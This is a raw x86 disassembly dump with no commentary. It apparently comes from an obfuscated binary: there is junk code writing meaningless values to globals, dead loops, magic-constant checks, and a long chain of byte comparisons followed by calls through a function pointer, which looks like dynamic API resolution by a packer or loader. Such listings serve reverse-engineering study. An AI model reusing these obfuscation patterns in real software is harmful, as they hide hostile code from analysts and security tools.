  4206c0:	push   ebx
  4206c1:	sub    DWORD PTR [eax-0x6bf285fa],esi
  4206c7:	add    DWORD PTR [esi+0x726b4234],edx
  4206cd:	lahf   
  4206ce:	fwait
  4206cf:	sti    
  4206d0:	inc    esp
  4206d1:	cwde   
  4206d2:	call   0xdb73f43c
  4206d7:	(bad)  
  4206d8:	popa   
  4206d9:	mov    al,ds:0xf90121c8
  4206de:	jge    0x42068d
  4206e0:	call   0xb7b27d28
  4206e5:	xchg   edi,eax
  4206e6:	mov    bh,0x24
  4206e8:	in     al,0xc4
  4206ea:	loop   0x420675
  4206ec:	jge    0x4206d2
  4206ee:	mov    edi,DWORD PTR [ebp+0x8]
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42aa47
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42aa03
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42aa17
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a0cb
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42aa1b
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42aa1f
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42aa23
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42aa27
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42aa2b
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42aa2f
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42aa33
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
